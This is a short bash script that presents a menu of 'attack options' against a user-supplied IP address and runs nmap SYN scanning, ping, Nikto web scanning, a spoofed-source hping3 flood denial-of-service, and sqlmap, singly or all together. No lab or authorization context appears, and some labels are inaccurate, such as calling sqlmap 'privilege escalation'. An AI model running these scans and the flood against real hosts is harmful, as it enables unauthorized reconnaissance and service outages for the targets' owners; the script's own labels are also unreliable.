#!/bin/bash

# Check if the user is root
if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi
echo "Available Attack Options:"
echo "PORT SCANNING:"
echo "	1. NMAP"
echo "	2. Ping"
echo "	3. Nikto"
echo "DoS Attack:"
echo "	4. hping"
echo "Privilege Escalation:"
echo "	5. SQLmap"
echo "	6. Run All Attacks"

read -p "Enter the IP address: " target_ip
read -p "Enter the attack option (1-6): " attack_option

case $attack_option in
    1)
        echo "Starting NMAP Port Scan: "
        nmap -sS "$target_ip" -p 1-1000
        ;;
    2)
        echo "Starting Ping: "
        ping -c 10 "$target_ip"
        ;;
    3)
        echo "Starting Nikto Scan: "
        nikto -h "$target_ip"
        ;;
    4)
        echo "Starting hping DoS Attack"
        hping3 -c 100 -p 21 -w 64 -d 120 --flood --rand-source "$target_ip"
        ;;
    5)
        echo "Starting SQLmap for Privilege Escalation"
        sqlmap -u "$target_ip:80"
        ;;
    6)
        echo "Running All Attacks"

        echo "1. NMAP Port Scan: "
        nmap -sS "$target_ip" -p 1-1000

        echo "2. Ping: "
        ping -c 10 "$target_ip"

        echo "3. Nikto Scan: "
        nikto -h "$target_ip"

        echo "4. hping DoS Attack"
        hping3 -c 100 -p 21 -w 64 -d 120 --flood --rand-source "$target_ip"

        echo "5. SQLmap for Privilege Escalation"
        sqlmap -u "$target_ip:80"
        ;;
    *)
        echo "Invalid attack option. Please choose a valid option (1-6)."
        ;;
esac

echo "Attack completed."
